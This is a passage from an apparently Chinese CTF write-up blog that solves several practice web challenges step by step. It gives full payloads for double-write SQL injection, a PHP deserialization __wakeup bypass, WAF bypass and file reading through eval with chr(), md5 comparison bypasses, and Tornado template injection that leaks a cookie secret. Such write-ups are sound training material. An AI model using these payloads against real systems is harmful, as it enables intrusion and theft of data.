src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744401.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744416.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑fuzz测试，发现过滤字符，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744443.png">尝试双写绕过，先看看有几个字段</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; oorrder bbyy 4 --+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745244.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">用三回显不同，所以有三个字段，判断一下注入点</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,3 --+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745204.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现回显为在第二个字段和第三个字段。来查询一下它里面所有的库</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑 再接下来就是查询表中字段咯，和上面一道sql题一样，不过这次要双写绕过。</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name&#x3D;&#39;Flag&#39;--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746538.png"></p><p> 再查询一下字段中的内容</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746488.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><h3 id="一、本题做题思路-11"><a href="#一、本题做题思路-11" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041748182.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看网上大佬WP这道题是有个猫的，不过我的不知道为什么没刷出来，不过无伤大雅</p><p>按照所给提示，有备份的好习惯，可以扫描目录得到<a href="http://www.zip(可以通过python脚本扫描或者通过kali上dirb工具,记得找个字典.)/">www.zip(可以通过python脚本扫描或者通过kali上Dirb工具，记得找个字典。)</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041748172.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 源代码可以看这位 <a href="https://blog.csdn.net/weixin_46685211/article/details/116395600?spm=1001.2014.3001.5502">大佬的博客</a></p><p>得到一个压缩包，里面有着其源代码 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041749855.png"></p><p>查询一番能得到的线索从class.php和index.php得到</p><p><strong>class.php</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123;    private $username &#x3D; &#39;nonono&#39;;    private $password &#x3D; &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function __wakeup()&#123;        $this-&gt;username &#x3D; &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password !&#x3D; 100) &#123;            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;            die();        &#125;        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>index.php</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php   include &#39;class.php&#39;;   $select &#x3D; $_GET[&#39;select&#39;];   $res&#x3D;unserialize(@$select);   ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过class.php里的__construct，__wakeup,__destruct函数可以判断index.php中的反序列化存在漏洞。先通过class.php的内容构建一个反序列化,构造后的结果如下图。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041750938.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">修改前 O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;修改后 O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;修改前O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D修改后O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在class.php里，要满足username&#x3D;admin 和 password&#x3D;100从而满足得到flag的条件，而在index.php里，我们知道get传参传的是 <strong>select 。</strong>但<strong>select</strong>要被反序列化才行。而为什么还需要使用<strong>urlencode</strong>对序列化后的**$b<strong>进行，</strong>是因为private序列化后的特使字符如果不使用字符表示会无法显示出来。而当当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字。**</p><p>最后再使用select传参得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041752862.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-6"><a href="#二、本题知识点-6" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>__construct()：创建对象时初始化，当一个对象创建时被调用<br> __wakeup() 使用unserialize时触发<br> __sleep() 使用serialize时触发<br> __destruction()：结束时销毁对象，当一个对象销毁时被调用</p></blockquote><p><strong>对由private定义的，尽量使其用字符转化一下，相较于public，private产生的特使字符无法正常显示出来。</strong></p><p><strong>绕过______wakeup() 当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字</strong>。</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="一、本题做题思路-12"><a href="#一、本题做题思路-12" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>这题光靠打开页面什么也得不到，只能通过题目得到提示，然后对网站后缀进行搜索找到备份网站。</p><p>通过dirsearch找到备份网站为<strong>url+&#x2F;index.php,bak。</strong>得到一个文件，打开后发现是代码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) &#123;    $key &#x3D; $_GET[&#39;key&#39;];&#x2F;&#x2F;$key&#x3D;key    if(!is_numeric($key)) &#123;        exit(&quot;Just num!&quot;);&#x2F;&#x2F;判断$key是不是数字。    &#125;    $key &#x3D; intval($key);    $str &#x3D; &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key &#x3D;&#x3D; $str) &#123;        echo $flag;  $key弱等于字符串$str    &#125;&#125;else &#123;    echo &quot;Try to find out source file!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></blockquote><p>所以就需要$key是数字，且能等于$str,因为是弱等于，所以可以构造<strong>payload: url+&#x2F;?key&#x3D;123</strong></p><p><strong>得到flag</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754498.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h3 id="一、本题做题思路-13"><a href="#一、本题做题思路-13" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>光看页面就是简单的计算器</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754486.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以从源代码里面找找线索，找到了一个calc.php。和题主用waf来确保安全，访问calc.php</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755628.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755604.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">源代码如下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;        $str &#x3D; $_GET[&#39;num&#39;];  &#x2F;&#x2F;get传参        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) &#123;                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;                        die(&quot;what are you want to do?&quot;);                &#125;        &#125;        eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>preg_match 函数用于执行一个正则表达式匹配。</strong> </p><p>再结合上面所给的提示，所以我们需要用php的字符串解析特性从而达到绕过waf的效果，可以在num前加一个空格(或者加一个+)。</p><blockquote><p>构造payload: url+&#x2F;calc.php? num&#x3D;print_r(scandir(‘&#x2F;‘));</p></blockquote><p>得到的是错误的回显，放入BP查看，发现其把’ ‘给过滤掉了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756801.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756862.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">不过我们还可以通过chr()绕过，chr(47),47就是代表&#x2F;</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756826.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756800.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p>所以可以构造为  url+&#x2F;calc.php? num&#x3D;print_r(scandir(chr(47)));</p><p>&#x2F;&#x2F;也可以使用var_dump()代替print_r();</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756840.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在第八个找到我们的目标，因为它把’ ‘过滤了，所以我们只能chr()一个字符一个字符的绕过</p><blockquote><p>构造为 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">url+&#x2F;calc.php? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>类似于 url+&#x2F;?calc.php? num&#x3D;print_r(file_get_contents(‘&#x2F;f1agg’));</p></blockquote><p>从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756870.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-7"><a href="#二、本题知识点-7" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>(1)、chr绕过，当出现类似于’ ‘和&#x2F;过滤的时候可以考虑通过chr来进行绕过，从而完成所想达到的目的。</p><p>(2)、利用php字符的解析特性从而达到绕过waf的目的。</p><p>*<em>PHP需要将所有参数转换为有效的变量名，因此在解析查询*</em><a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>*<em>时，它会做两件事：</em>*</p><p><strong>(1）删除空白符</strong></p><p><strong>(2）将某些字符转换为下划线（包括空格）</strong></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><h3 id="一、本题做题思路-14"><a href="#一、本题做题思路-14" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开后发现和上面哪一题界面一模一样,老规矩，从源代码里面找找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757291.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现一个独特的php，访问一下看看能得到什么 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757297.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">flag需要money&#x3D;100000000，然后必须是来自CUIT的学生。 </p><p>其界面写出了要得到flag的限制条件，在源代码里面则是有着一串代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;!--~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;$password &#x3D; $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#x2F;&#x2F;判断password是不是数字。&#125;elseif ($password &#x3D;&#x3D; 404) &#123;echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;&#125;&#125;--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到cookie等于0,考虑到计算机的世界只有俩个数字(滑稽)。尝试改成1后再传password的参试试。 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758517.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758605.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">修改后需要我们满足另一个条件了足够的钱，根据上面代码所表示，钱是$money。发现如果直接传money&#x3D;100000000会出现如下图的结果。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758662.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">根据我们以往所学，他说字符太长了，我们可以通过科学计数法来解决这种问题</p><blockquote><p>构造payload  password&#x3D;404a&amp;money&#x3D;1e9 </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="一、本题做题思路-15"><a href="#一、本题做题思路-15" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开界面什么都得不到，输入也没什么变化</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759496.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在抓包的时候找到了提示<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759493.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">即构造$pass经md5加密后出现**<code>or</code>** ，可令该SQL语句返回**<code>true</code><strong>。不过还是不会，看大佬WP是用</strong><code>ffifdyop</code><strong>绕过，因为这个字符被MD5哈希了之后前几位刚好是</strong><code>&#39; or &#39;6</code>** 所以这里就绕过去了。</p><p>跳转到一个新的网站，从源代码里可以找到本题解题关键</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800595.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;!--$a &#x3D; $GET[&#39;a&#39;];$b &#x3D; $_GET[&#39;b&#39;];if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;    &#x2F;&#x2F; wow, glzjin wants a girl friend.--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">$a不等于$b，但是md5($a)等于md5($b),平常经常遇到的md5弱等于绕过。</p><blockquote><p>可以构建   url+&#x2F;levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p></blockquote><p>又进入一个新的网页</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800536.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;    echo $flag;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">这又考我们md5强等于绕过，可以通过数组绕过来得到flag</p><blockquote><p>构建payload为 param1[]&#x3D;1&amp;param2[]&#x3D;2 </p></blockquote><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800930.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-8"><a href="#二、本题知识点-8" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>(1)、绕过md5进行注入，通过其进行哈希后的前几位字母满足注入公式所需从而达成目的</p><p>(2)、MD5弱等于绕过，其实可以看<a href="https://www.cnblogs.com/87x00/p/15832075.html">这个佬的博客</a>，已经将弱等于和强等于都说了，弱等于就是部分字符串md5后是0exxx，刚好满足科学计数法，在弱等于当中，函数会判断其相等，但是其本质又不想等，所以可以绕过</p><p>(3)、MD5强等于绕过，通过数组进行绕过。因为md5函数无法处理数组。</p></blockquote><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="一、本题做题思路-16"><a href="#一、本题做题思路-16" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开发现有三个txt文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801607.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>flag.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801589.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">welcome.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801598.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> hints.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801599.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">且当我们在访问的时候，我们可以发现有参数传入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801611.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>filename</strong>和<strong>filehash 。</strong>   </p><p>结合flag.txt里的内容，想要得到flag应该是构造</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(filename))</p></blockquote><p>但是我们不知道cookie_secret在哪。不过既然flag.txt和hints.txt都用了，那么八成线索是在最后一个文本render。通过上网查询和看大佬wp。得知**render()**是tornado里的函数，可以**生成html模板。**再结合本题题目easy_tornado。猜测为SSTI服务器模板注入。</p><p>具体可去<a href="https://www.tornadoweb.org/en/stable/web.html">该网站</a>了解</p><p>所以先尝试</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;1    （{是{,}是}）</p></blockquote><p>回显为 Error</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">报错说明可能存在过滤，尝试通过该模板测试是否有SSTI注入</p><blockquote><p>url+&#x2F;error?msg&#x3D;1     </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801968.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">能注入，所以我们可以去尝试找到cookie_secret</p><p>在Tornado框架的附属文件handler.settings中存在cookie_secret。所以我们可以构造payload如下</p><blockquote><p>url+&#x2F;error?msg&#x3D; </p></blockquote><p>得到cookie_secret。</p><blockquote><p>cookie_secret&#x3D;3742f17c04ab407ca3bf4fa775921ec2(杠被我去掉了)</p></blockquote><p>重新返回最初的地方去尝试获取flag。</p><blockquote><p>即可构造url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(&#x2F;fllllllllllllag))</p></blockquote><p>经过计算可构造</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;57fb487e8a01aeae99949369c6022f78</p></blockquote><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801964.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-9"><a href="#二、本题知识点-9" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> 基本上都是参考这个<a href="https://blog.csdn.net/qq_51927659/article/details/116031923?spm=1001.2014.3001.5502">大佬博客</a>从而达到复现的结果。</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="一、本题做题思路-17"><a href="#一、本题做题思路-17" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803458.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过主页面发现有俩个选项，一个登录，一个注册。根据题目先试试admin登录一下</p><p>额，发现username输入admin password输入123直接就得到了flag</p><p> <img 